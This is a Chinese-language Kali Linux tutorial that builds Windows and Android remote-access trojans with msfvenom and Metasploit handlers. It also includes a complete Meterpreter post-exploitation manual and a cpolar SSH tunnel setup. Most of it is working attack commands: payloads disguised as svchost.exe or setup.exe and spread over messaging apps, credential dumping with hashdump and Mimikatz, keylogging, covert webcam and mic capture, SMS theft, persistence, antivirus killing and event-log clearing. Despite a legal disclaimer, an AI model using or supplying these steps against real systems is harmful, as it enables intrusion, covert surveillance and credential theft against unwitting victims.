# Kali Linux 渗透测试实战教程

> **警告：本教程仅供授权安全测试、学术研究及防御能力提升使用。未经授权入侵他人计算机系统属违法犯罪行为。**

---

## 目录

- [0. 前置准备](#0-前置准备)
- [1. Windows 远控实战](#1-windows-远控实战)
- [2. Android 远控实战](#2-android-远控实战)
- [3. Meterpreter 后渗透完整指令手册](#3-meterpreter-后渗透完整指令手册)
- [4. Kali + cpolar 实现 SSH 远程连接](#4-kali--cpolar-实现-ssh-远程连接)
- [5. 故障排查](#5-故障排查)

---

## 0. 前置准备

### 0.1 环境说明

| 角色 | 系统 | 说明 |
|------|------|------|
| 攻击机 | Kali Linux | 渗透测试专用系统，预装 Metasploit、msfvenom 等工具 |
| 靶机 (Windows) | Windows 10/11 | 被测试的 Windows 机器，建议使用虚拟机 |
| 靶机 (Android) | Android 10+ | 被测试的安卓设备，建议使用模拟器 |

### 0.2 网络要求

- 攻击机与靶机必须在**同一局域网**（或通过内网穿透可达）
- 靶机需要能访问攻击机的 IP 地址
- 建议使用 NAT 或 Host-Only 网络模式（虚拟机环境）

### 0.3 查看 Kali IP 地址

```bash
# 方式一：ifconfig（推荐）
ifconfig
# 找到 eth0 或 ens33 中的 inet 地址，例如：192.168.1.100

# 方式二：ip 命令
ip addr show
# 查看 inet 后面的 IP

# 方式三：hostname
hostname -I
```

**注意：** 每次重启或更换网络后 IP 可能变化，生成木马前务必重新确认。

### 0.4 常用端口说明

| 端口 | 说明 |
|------|------|
| 4444 | Metasploit 默认监听端口（可自定义） |
| 80 | Apache Web 服务默认端口（供靶机下载文件） |
| 22 | SSH 远程连接端口 |
| 3389 | Windows RDP 远程桌面端口 |
| 5555 | ADB 默认端口 |

---

## 1. Windows 远控实战

### 攻击流程总览

```
生成木马(msfvenom) → 启动Web服务(Apache) → 配置监听(msfconsole)
→ 靶机下载运行 → 获取Meterpreter会话 → 后渗透操作 → 清理痕迹
```

---

### 步骤 1：切换到 root 权限

```bash
sudo su
```

**为什么要 root：** Apache 服务默认监听 80 端口（特权端口），且 msfvenom 生成的木马放在 `/var/www/html/` 需要 root 写入权限。

---

### 步骤 2：生成 Windows 木马

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<你的Kali IP> LPORT=<监听端口> -f exe -o <文件名>.exe
```

**参数详解：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `-p` | Payload 类型 | `windows/x64/meterpreter/reverse_tcp`（64位）或 `windows/meterpreter/reverse_tcp`（32位） |
| `LHOST` | Kali 的 IP 地址（攻击机监听地址） | `192.168.1.100` |
| `LPORT` | 监听端口 | `4444`（可自定义，避免与常用端口冲突） |
| `-f` | 输出格式 | `exe`（Windows 可执行文件） |
| `-o` | 输出路径和文件名 | `/var/www/html/svchost.exe`（直接放到 Web 目录） |

**实际示例：**

```bash
# 64位系统
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe

# 32位系统（兼容性更好）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /var/www/html/svchost.exe

# 输出示例：
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 510 bytes
# Final size of exe file: 7168 bytes
# Saved as: /var/www/html/svchost.exe
```

**Payload 类型选择建议：**

| Payload | 适用场景 |
|---------|---------|
| `windows/x64/meterpreter/reverse_tcp` | 目标为 64 位 Windows，稳定 TCP 连接 |
| `windows/meterpreter/reverse_tcp` | 目标为 32 位 Windows |
| `windows/x64/meterpreter/reverse_https` | 需要绕过防火墙/IDS，HTTPS 加密通信 |
| `windows/x64/meterpreter_reverse_tcp` |  stageless 版本，单文件较大但更稳定 |

---

### 步骤 3：启动 Apache Web 服务

```bash
# 启动 Apache
systemctl start apache2.service

# 验证服务状态
systemctl status apache2.service

# 验证木马文件可访问（浏览器打开）
# http://<你的IP>/svchost.exe

# 设置开机自启（可选）
systemctl enable apache2.service
```

**如果 Apache 未安装：**

```bash
apt update && apt install apache2 -y
```

---

### 步骤 4：启动 Metasploit 并配置监听

```bash
# 启动 MSF 控制台
msfconsole
```

进入 `msf6 >` 提示符后，粘贴以下配置：

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
show options
exploit -j -z
```

**参数详解：**

| 命令 | 说明 |
|------|------|
| `use exploit/multi/handler` | 使用通用监听模块 |
| `set payload ...` | 必须与生成木马时的 payload **完全一致** |
| `set LHOST` | 监听地址（如果 Kali 有多个 IP，设为 0.0.0.0 监听全部） |
| `set LPORT` | 监听端口（必须与生成木马时一致） |
| `show options` | 确认所有配置正确 |
| `exploit -j -z` | `-j` 后台运行，`-z` 不立即与会话交互 |
| `exploit` | 前台运行（等待上线时可用） |

**预期输出：**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
```

---

### 步骤 5：靶机下载并运行木马

**下载方式（靶机操作）：**

```
浏览器访问：http://192.168.1.100/svchost.exe
```

**注意：**
- Windows Defender 可能拦截下载——测试环境建议**临时关闭实时保护**
- 部分浏览器（Edge）会警告「不安全下载」→ 点「保留」即可
- 模拟真实场景时，可将文件名伪装为 `setup.exe`、`update.exe` 等

**运行木马后，Kali 端会出现：**

```
[*] Sending stage (200262 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:49876)
```

---

### 步骤 6：进入 Meterpreter 会话

```bash
sessions           # 列出所有活跃会话
sessions -i 1      # 进入会话 ID=1
```

**`sessions` 命令常用参数：**

| 命令 | 说明 |
|------|------|
| `sessions` | 列出所有会话 |
| `sessions -i <id>` | 进入指定会话 |
| `sessions -k <id>` | 终止指定会话 |
| `sessions -u <id>` | 将会话升级为 Meterpreter |
| `sessions -n <name>` | 为会话命名 |
| `background` | 将当前会话放入后台（在 meterpreter 中执行） |

---

### 步骤 7：测试完成后清理

```bash
# 1. 在 Meterpreter 中清除事件日志（可选）
meterpreter > clearev

# 2. 退出会话
meterpreter > exit

# 3. 在 MSF 中停止监听
msf6 > jobs -K

# 4. 停止 Apache 服务
sudo systemctl stop apache2.service

# 5. 确认 Apache 已停止
sudo systemctl is-active apache2.service
# 应输出：inactive

# 6. 删除 Web 目录中的木马文件
sudo rm /var/www/html/svchost.exe

# 7. 查看 Apache 是否开机自启（通常不需要）
sudo systemctl is-enabled apache2.service
# 如果输出 enabled，执行：
sudo systemctl disable apache2.service
```

---

## 2. Android 远控实战

### 攻击流程总览

```
生成APK(msfvenom) → 签名APK(jarsigner) → 靶机安装运行
→ 监听上线 → Meterpreter会话 → 核心功能演示
```

---

### 步骤 1：生成 Android APK 木马

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=<监听端口> -o <文件名>.apk
```

**实际示例：**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o evil.apk

# 输出示例：
# [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
# [-] No arch selected, selecting arch: dalvik from the payload
# No encoder specified, outputting raw payload
# Payload size: 10146 bytes
```

**关于 Payload：**

| Payload | 说明 |
|---------|------|
| `android/meterpreter/reverse_tcp` | 标准 TCP 反弹（推荐） |
| `android/meterpreter/reverse_https` | HTTPS 加密反弹（绕过检测） |
| `android/meterpreter_reverse_tcp` | Stageless 版本（单文件，体积更大） |

---

### 步骤 2：签名 APK

> Android 系统禁止安装未签名的 APK，必须签名后才能安装。

```bash
# 第一步：生成签名证书（仅首次需要）
keytool -genkey -v -keystore my.keystore -alias my -keyalg RSA \
  -keysize 2048 -validity 9125 \
  -noprompt \
  -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
  -storepass 123456 -keypass 123456

# 第二步：使用证书签名 APK
jarsigner -verbose \
  -keystore my.keystore \
  -storepass 123456 \
  -keypass 123456 \
  -signedjar signed.apk \
  evil.apk \
  my

# 第三步：验证签名
jarsigner -verify -verbose signed.apk
```

**参数详解：**

| 参数 | 说明 |
|------|------|
| `-genkey` | 生成密钥对 |
| `-keystore my.keystore` | 密钥库文件名 |
| `-alias my` | 别名（签名时引用） |
| `-keyalg RSA` | 密钥算法 |
| `-keysize 2048` | 密钥长度 |
| `-validity 9125` | 证书有效期（天），9125≈25年 |
| `-signedjar signed.apk` | 签名后的输出文件 |
| `123456` | 密钥库密码（生产环境请使用强密码） |

**注意：** 安装时使用 `signed.apk`，而非未签名的 `evil.apk`。

---

### 步骤 3：启动监听器

```bash
msfconsole -q -x "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j -z
"
```

**预期输出：**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
```

---

### 步骤 4：靶机安装 APK

**方式一：通过 ADB（推荐，适合模拟器/开发者模式真机）**

```bash
# 确认设备连接
adb devices
# 输出：emulator-5554   device

# 推送 APK 到设备
adb push signed.apk /sdcard/

# 在设备上安装
adb install signed.apk

# 如果更新已有 APK
adb install -r signed.apk
```

**ADB 环境配置（Windows）：**

1. 下载 [Android SDK Platform Tools](https://developer.android.com/tools/releases/platform-tools)
2. 解压到 `C:\platform-tools\`
3. 将 `C:\platform-tools\` 添加到系统环境变量 PATH
4. 打开 CMD 验证：`adb version`

**方式二：直接传输安装**

1. 将 `signed.apk` 通过微信/QQ/网盘传给目标设备
2. 在文件管理器中找到 APK 文件
3. 点击安装，允许「未知来源」权限
4. 安装完成后桌面出现应用图标

**推荐模拟器：**

| 模拟器 | 特点 |
|--------|------|
| Android Studio AVD | 官方模拟器，兼容性最好 |
| MuMu 模拟器 | 性能好，适合游戏测试 |
| 夜神模拟器 | 支持多开，自带 Root |
| Genymotion | 专业安卓虚拟化 |

---

### 步骤 5：进入会话

```bash
sessions           # 查看所有会话
sessions -i 1      # 进入第一个会话
```

---

### 步骤 6：核心后渗透命令

**系统信息：**

```bash
meterpreter > sysinfo
# Computer        : localhost
# OS              : Android 12 - Linux 5.4.32 (aarch64)
# Architecture    : aarch64
# System Language : zh_CN
# Meterpreter     : dalvik/android

meterpreter > getuid          # 当前用户权限
meterpreter > check_root      # 检查是否已 root
```

**进入 Android Shell：**

```bash
meterpreter > shell
# 进入安卓系统的 Linux Shell 环境

$ whoami           # 查看当前用户
$ id               # 查看 UID/GID
$ uname -a         # 内核信息
$ getprop ro.build.version.sdk  # 查看 SDK 版本
$ pm list packages | grep <关键词>  # 列出已安装应用
$ exit             # 返回 meterpreter
```

**文件操作：**

```bash
meterpreter > ls /sdcard
meterpreter > cd /sdcard/DCIM/Camera
meterpreter > download IMG_001.jpg /root/loot/
meterpreter > upload /root/payload.sh /sdcard/
meterpreter > cat /sdcard/Download/notes.txt
meterpreter > search -f *.pdf -d /sdcard
```

**摄像头 & 音频：**

```bash
meterpreter > webcam_list        # 列出摄像头（通常有前后两个）
meterpreter > webcam_snap        # 拍照（保存到 /root）
meterpreter > webcam_stream      # 实时视频流（浏览器查看）
meterpreter > record_mic -d 10   # 录制 10 秒音频
meterpreter > play /sdcard/alert.wav  # 播放音频文件
```

**定位：**

```bash
meterpreter > geolocate          # GPS 定位
meterpreter > wlan_geolocate     # WiFi 定位（通常更准确）
```

**通讯录/短信/通话记录（需 root 权限）：**

```bash
meterpreter > dump_sms           # 导出短信
meterpreter > dump_contacts      # 导出通讯录
meterpreter > dump_calllog       # 导出通话记录
```

**发送短信：**

```bash
meterpreter > send_sms -d +8613800138000 -t "Test message from MSF"
```

**隐藏应用图标：**

```bash
meterpreter > hide_app_icon      # 隐藏桌面图标（保持后台运行）
```

---

### 步骤 7：一键脚本

将以下脚本保存为 `android_rush.sh`，一键完成生成+签名+启动监听：

```bash
#!/bin/bash
# Android 远控一键脚本
# 用法：chmod +x android_rush.sh && ./android_rush.sh

IP=$(hostname -I | awk '{print $1}')
PORT=4444

echo "=== Kali IP: $IP ==="
echo "=== 监听端口: $PORT ==="

# 生成 APK
echo "[1/3] 生成 APK..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o evil.apk

# 签名（首次自动生成证书）
echo "[2/3] 签名 APK..."
if [ ! -f my.keystore ]; then
    keytool -genkey -keystore my.keystore -alias my -keyalg RSA \
      -keysize 2048 -validity 9125 -noprompt \
      -dname "CN=Test, OU=Dev, O=Lab, L=City, S=State, C=CN" \
      -storepass 123456 -keypass 123456
fi
jarsigner -keystore my.keystore -storepass 123456 -keypass 123456 \
  -signedjar signed.apk evil.apk my

echo "[3/3] 完成！"
echo ">>> 签名完成：$(pwd)/signed.apk"
echo ""
echo ">>> 在新终端启动监听："
echo "msfconsole -q -x \"use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; exploit -j -z\""
```

**使用方式：**

```bash
chmod +x android_rush.sh
./android_rush.sh
```

---

## 3. Meterpreter 后渗透完整指令手册

> 所有命令均在 `meterpreter >` 提示符下执行。

### 3.1 文件系统操作

| 命令 | 说明 | 示例 |
|------|------|------|
| `ls` | 列出当前目录 | `ls C:\\Users\\` |
| `pwd` | 当前工作目录（目标机） | `pwd` |
| `cd <path>` | 切换目录 | `cd C:\\Users\\Admin\\Desktop` |
| `cat <file>` | 查看文件内容 | `cat passwords.txt` |
| `edit <file>` | 编辑文件（打开 vim） | `edit config.ini` |
| `mkdir <dir>` | 创建目录 | `mkdir C:\\temp\\` |
| `rmdir <dir>` | 删除目录 | `rmdir C:\\temp\\` |
| `rm <file>` | 删除文件 | `rm evidence.log` |
| `cp <src> <dst>` | 复制文件 | `cp a.txt b.txt` |
| `mv <src> <dst>` | 移动/重命名文件 | `mv payload.exe svchost.exe` |
| `search -f <pattern> -d <path>` | 搜索文件 | `search -f *.docx -d C:\\Users\\` |
| `upload <local> <remote>` | 上传文件到目标 | `upload /root/nc.exe C:\\Windows\\Temp\\` |
| `download <remote> <local>` | 下载文件到 Kali | `download C:\\data.db /root/loot/` |
| `checksum md5 <file>` | 计算文件哈希 | `checksum md5 C:\\Windows\\System32\\config\\SAM` |

### 3.2 系统信息 & 状态

| 命令 | 说明 |
|------|------|
| `sysinfo` | 系统信息（OS 版本、架构、域等） |
| `getuid` | 当前用户权限（如 `NT AUTHORITY\SYSTEM`） |
| `getpid` | 当前 Meterpreter 所在进程 PID |
| `getprivs` | 列出当前进程拥有的权限 |
| `ps` | 列出所有运行中的进程 |
| `pgrep <name>` | 按名称搜索进程 | `pgrep lsass.exe` |
| `kill <pid>` | 结束指定 PID 的进程 |
| `execute -f <程序>` | 执行程序 | `execute -f cmd.exe -i -H` |
| `shell` | 进入目标系统 Shell（Windows 为 cmd，Linux 为 bash） |
| `idletime` | 查看用户空闲时间（判断是否有人在用电脑） |
| `uptime` | 系统运行时间 |
| `reboot` | 重启目标系统 |
| `shutdown` | 关闭目标系统 |

**`execute` 参数详解：**

| 参数 | 说明 |
|------|------|
| `-f` | 指定要执行的程序 |
| `-i` | 交互模式（可看到输出） |
| `-H` | 隐藏窗口（后台运行） |
| `-c` | 传递命令行参数 |

### 3.3 权限提升 & 凭据获取

```bash
meterpreter > getsystem
# 尝试提权到 NT AUTHORITY\SYSTEM
# 常用技术：命名管道模拟、令牌复制

meterpreter > getprivs
# 查看当前令牌权限，关键权限：
# SeDebugPrivilege       → 可调试/注入任意进程
# SeImpersonatePrivilege → 可模拟客户端令牌
# SeAssignPrimaryTokenPrivilege → 可分配主令牌

meterpreter > hashdump
# 导出 SAM 数据库中的密码哈希（需 SYSTEM 权限）
# 输出格式：用户名:RID:LM哈希:NTLM哈希:::

meterpreter > load kiwi
# 加载 Mimikatz 扩展（Kiwi）

meterpreter > creds_all
# 导出所有已缓存的凭据（明文密码/NTLM哈希/Kerberos票据）

meterpreter > lsa_dump
# 导出 LSA 中的凭据信息

meterpreter > creds_wdigest
# 导出 WDigest 凭据（如果启用）
```

### 3.4 进程迁移 & 持久化

```bash
meterpreter > migrate <PID>
# 将 Meterpreter 迁移到稳定进程（如 explorer.exe、svchost.exe）
# 迁移后原进程退出，payload 在新进程中存活

meterpreter > run post/windows/manage/migrate
# 自动选择合适进程迁移

meterpreter > run persistence -U -i 5 -p 4444 -r <Kali IP>
# 安装启动项持久化
# -U: 用户登录时启动
# -i 5: 每 5 秒回连
# -p 4444: 回连端口
# -r IP: 回连地址

meterpreter > run metsvc -A
# 安装 Meterpreter 服务（以 Windows 服务形式持久化）
# 注意：杀软可能会检测到此服务
```

**迁移最佳实践：**

- 优先迁移到 `explorer.exe`（用户态进程，长期存活）
- 避免迁移到杀软进程（会触发自我保护）
- 32 位 payload 只能迁移到 32 位进程
- 64 位 payload 只能迁移到 64 位进程

### 3.5 屏幕、摄像头、音频

```bash
meterpreter > screenshot
# 截取当前屏幕，保存为 JPEG 文件

meterpreter > screenshare
# 实时桌面共享（通过浏览器查看）

meterpreter > webcam_list
# 列出所有摄像头

meterpreter > webcam_snap
# 使用默认摄像头拍照

meterpreter > webcam_stream
# 开启摄像头实时视频流

meterpreter > record_mic -d <秒数>
# 录制麦克风音频

meterpreter > play <音频文件路径>
# 在目标机上播放音频文件
```

### 3.6 键盘记录

```bash
meterpreter > keyscan_start
# 开始记录键盘输入
# 会捕获目标机的所有按键

meterpreter > keyscan_dump
# 输出已捕获的键盘记录

meterpreter > keyscan_stop
# 停止键盘记录
```

**注意：** `keyscan_start` 会扫描目标机所有窗口的键盘输入，包括密码输入框。

### 3.7 用户 & 远程桌面

```bash
meterpreter > run post/windows/gather/enum_logged_on_users
# 枚举已登录用户

meterpreter > run getgui -u <用户名> -p <密码>
# 创建用户并启用 RDP

meterpreter > run post/windows/manage/enable_rdp
# 仅启用远程桌面（不创建用户）

meterpreter > idletime
# 查看用户空闲时间（判断是否适合操作）
```

### 3.8 网络相关

```bash
meterpreter > ipconfig
# 查看目标机网络配置

meterpreter > ifconfig
# 同上（Linux 风格命令名）

meterpreter > netstat -an
# 查看所有网络连接和监听端口

meterpreter > route
# 查看/修改路由表

meterpreter > arp
# 查看 ARP 缓存表

meterpreter > portfwd add -l <本地端口> -p <目标端口> -r <目标IP>
# 端口转发：将目标内网端口映射到 Kali 本地
# 示例：将目标内网 3389 映射到 Kali 的 1234 端口
meterpreter > portfwd add -l 1234 -p 3389 -r 127.0.0.1

meterpreter > portfwd list
# 列出所有端口转发规则

meterpreter > portfwd delete -l <本地端口>
# 删除指定端口转发
```

### 3.9 清除痕迹

```bash
meterpreter > clearev
# 清除 Application、System、Security 三类 Windows 事件日志

meterpreter > run multi_console_command -rc /root/cleanup.rc
# 批量执行资源文件中的清理命令
```

### 3.10 其他实用模块

```bash
meterpreter > run scraper
# 自动收集大量系统信息（用户、网络、补丁、软件等）

meterpreter > run killav
# 尝试关闭目标机上的杀毒软件

meterpreter > run post/windows/gather/checkvm
# 检测目标是否运行在虚拟机中

meterpreter > run post/multi/recon/local_exploit_suggester
# 自动检测本地提权漏洞

meterpreter > load powershell
# 加载 PowerShell 扩展

meterpreter > powershell_execute "Get-Process | Select Name,Id"
# 执行 PowerShell 命令

meterpreter > background
# 将会话放入后台（返回 msf 控制台）
# 之后可用 sessions -i <id> 重新进入
```

### 3.11 一条龙操作示例

```bash
# 场景：上传 Payload → 后台执行 → 下载结果
meterpreter > upload /root/payload.exe C:\\Users\\Public\\
meterpreter > execute -f C:\\Users\\Public\\payload.exe -i -H
meterpreter > download C:\\Users\\Public\\result.txt /root/loot/

# 场景：搜索敏感文件并打包下载
meterpreter > search -f *.docx -d C:\\Users\\
meterpreter > search -f *.pdf -d C:\\Users\\
meterpreter > download C:\\Users\\Admin\\Documents\\secret.docx /root/loot/

# 场景：抓取密码哈希 → 离线破解
meterpreter > hashdump
# 将输出的哈希保存为 hash.txt
# 用 hashcat 离线破解：
# hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 4. Kali + cpolar 实现 SSH 远程连接

> 适用场景：Kali 在内网（无公网 IP），需要通过外网 SSH 远程连接操作。

### 架构示意

```
外网用户 → cpolar公网域名:端口 → cpolar隧道 → Kali本地(22端口)
```

---

### 4.1 启动并配置 SSH 服务

```bash
# 启动 SSH 服务
sudo systemctl start ssh

# 查看运行状态
sudo systemctl status ssh
# 应看到：Active: active (running)

# 设置开机自启
sudo systemctl enable ssh
```

**配置 SSH 允许密码登录（默认可能仅允许密钥登录）：**

```bash
# 编辑 SSH 配置文件
sudo vim /etc/ssh/sshd_config
```

找到并修改以下配置项：

```
# 允许密码认证
PasswordAuthentication yes

# 允许 root 远程登录（可选，建议用普通用户）
PermitRootLogin yes

# 允许密钥认证
PubkeyAuthentication yes
```

保存后重启 SSH 服务使配置生效：

```bash
sudo systemctl restart ssh
```

**安全建议：**

- 修改默认 SSH 端口（22 → 2222 或其他高位端口）：
  ```
  Port 2222
  ```
- 使用强密码或仅使用密钥登录
- 限制登录尝试次数：
  ```
  MaxAuthTries 3
  ```

---

### 4.2 注册 cpolar 账号

1. 访问 [cpolar 官网](https://www.cpolar.com/)
2. 点击「注册」填写邮箱和密码
3. 登录后进入 [仪表盘](https://dashboard.cpolar.com/)
4. 在「验证」页面找到你的 **Authtoken**（后续认证需要）

---

### 4.3 安装 cpolar

```bash
# 方式一：一键安装脚本（推荐）
curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash

# 方式二：手动安装
# 1. 下载对应架构的包
# 2. dpkg -i cpolar_*.deb 或 rpm -ivh cpolar_*.rpm
```

**安装后验证：**

```bash
cpolar version
# 输出示例：cpolar version 3.x.x
```

---

### 4.4 配置 cpolar 认证

```bash
# 将 <你的Authtoken> 替换为 cpolar 仪表盘中获取的 token
cpolar authtoken <你的Authtoken>

# 示例：
cpolar authtoken ZjViODQwZWYtYjI0NS00xxxxxxxxxxxxxxxxxxxxxxx
```

**注意：** Authtoken 只需配置一次，配置信息保存在 `~/.cpolar/cpolar.yml` 中。

---

### 4.5 创建 SSH 隧道

```bash
# 创建 TCP 隧道，将本地 22 端口暴露到公网
cpolar tcp 22
```

**预期输出：**

```
Forwarding     tcp://0.tcp.cpolar.cn:12345 -> localhost:22
```

此时你的 SSH 连接地址为：
```
ssh <用户名>@0.tcp.cpolar.cn -p 12345
```

---

### 4.6 后台运行 & 开机自启

```bash
# 方式一：使用 systemd 后台运行
sudo systemctl enable cpolar
sudo systemctl start cpolar

# 方式二：使用 screen 保持后台
screen -S cpolar
cpolar tcp 22
# Ctrl+A, D 分离（断开但不停止）

# 恢复 screen 会话
screen -r cpolar
```

---

### 4.7 Web 管理界面

```bash
# 启动 cpolar 后，访问本地 Web 管理界面
# 浏览器打开：http://127.0.0.1:9200

# 如果没有 GUI 浏览器，可以用 curl 查看：
curl http://127.0.0.1:9200/api/tunnels
```

在 Web 界面可以：
- 查看所有活跃隧道及公网地址
- 查看流量统计
- 创建/删除隧道
- 配置隧道参数（HTTP/TCP/TLS）

---

### 4.8 固定 TCP 地址（Pro 功能）

免费版 cpolar 每次重启 tunnel 会分配**随机域名**。如需固定地址：

1. 升级到 cpolar Pro 版
2. 在仪表盘「预留」中创建固定 TCP 地址
3. 配置文件中使用固定地址：

```yaml
# ~/.cpolar/cpolar.yml
tunnels:
  ssh:
    proto: tcp
    addr: 22
    remote_addr: <你的固定地址>.cpolar.cn
    remote_port: <你的固定端口>
```

---

### 4.9 配置多个隧道（配置文件方式）

编辑 `~/.cpolar/cpolar.yml`：

```yaml
authtoken: <你的token>
tunnels:
  ssh:
    addr: 22
    proto: tcp
    region: cn_vip
  web:
    addr: 80
    proto: http
    region: cn_vip
    hostname: your-web.cpolar.cn
  vnc:
    addr: 5901
    proto: tcp
    region: cn_vip
```

启动所有隧道：

```bash
cpolar start-all
```

---

### 4.10 外网连接测试

```bash
# 在另一台机器上（或手机 Termux/JuiceSSH）
ssh kali@0.tcp.cpolar.cn -p 12345

# 输入密码后即可远程操作 Kali
# 断开连接：exit 或 Ctrl+D
```

---

## 5. 故障排查

### 5.1 木马生成失败

| 问题 | 原因 | 解决 |
|------|------|------|
| `msfvenom: command not found` | Metasploit 未安装 | `apt install metasploit-framework -y` |
| `No space left on device` | 磁盘空间不足 | `df -h` 检查，清理旧文件 |
| 生成后文件大小为 0 | 权限不足 | 使用 `sudo` 或切换到 root |

### 5.2 靶机运行木马后不上线

| 问题 | 原因 | 解决 |
|------|------|------|
| 防火墙拦截 | Windows Defender / 第三方防火墙 | 临时关闭防火墙测试 |
| IP 填写错误 | LHOST 填了错误的 IP | 用 `ifconfig` 重新确认 Kali IP |
| 端口未监听 | MSF 监听未启动 | `ss -tlnp` 检查端口是否在监听 |
| 网络不通 | 靶机无法访问 Kali | `ping <Kali IP>` 测试连通性 |
| Payload 不匹配 | 生成与监听的 payload 不一致 | 确保两边的 `windows/x64/meterpreter/reverse_tcp` 完全一致 |
| 架构不匹配 | 64 位 payload 在 32 位系统运行 | 使用 32 位 payload |

### 5.3 Apache 无法启动

```bash
# 检查 80 端口是否被占用
sudo ss -tlnp | grep :80

# 如果被占用，停掉占用进程或改用其他端口
# 编辑 Apache 配置修改监听端口
sudo vim /etc/apache2/ports.conf
# 将 Listen 80 改为 Listen 8080
sudo systemctl restart apache2
```

### 5.4 会话不稳定/频繁断开

| 原因 | 解决 |
|------|------|
| 网络波动 | TCP 连接对网络质量敏感 |
| 杀软查杀 | 使用 Veil、Shellter 等工具做免杀 |
| 进程被杀 | 迁移到稳定进程 `migrate <PID>` |
| 超时设置 | `set SessionCommunicationTimeout 0` 关闭超时 |

### 5.5 Android APK 无法安装

| 问题 | 原因 | 解决 |
|------|------|------|
| 「解析失败」 | APK 未签名 | 按步骤 2.2 执行签名流程 |
| 「未知来源」 | 未授权安装 | 设置 → 安全 → 允许「未知来源」 |
| 「安装包破损」 | 下载不完整 | 重新生成并签名 |
| 「版本过低」 | SDK 版本不兼容 | 检查 Android 版本（需 Android 6.0+） |

### 5.6 cpolar 连接失败

| 问题 | 原因 | 解决 |
|------|------|------|
| `authtoken invalid` | token 错误或过期 | 登录 cpolar 仪表盘重新获取 |
| 隧道启动后外网不通 | SSH 服务未运行 | `systemctl start ssh` |
| 端口显示 offline | 本地服务未监听 | `ss -tlnp | grep 22` 确认 SSH 已启动 |
| 连接频繁断开 | 免费版限制 | 升级到 Pro 或使用心跳保持连接 |

---

## 附录

### A. 常用快捷键

| 快捷键 | 说明 |
|--------|------|
| `Ctrl+C` | 在 msfconsole 中终止当前操作 |
| `Ctrl+Z` | 将当前会话放入后台 |
| `Ctrl+D` | 退出 shell / 退出 msfconsole |
| `Ctrl+L` | 清屏 |
| `Ctrl+R` | 搜索历史命令 |

### B. 推荐学习资源

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) — 官方免费教程
- [Hack The Box](https://www.hackthebox.com/) — 在线渗透测试实验平台
- [PentesterLab](https://pentesterlab.com/) — Web 渗透实践
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Web 安全风险清单

### C. 法律与伦理

- 仅在**自己拥有**或**获得明确书面授权**的系统上进行测试
- 学习渗透测试的目的是**提升防御能力**，而非攻击他人
- 未经授权入侵计算机系统可能构成**刑事犯罪**
- 建议在隔离的实验环境（虚拟机 + 内网）中练习
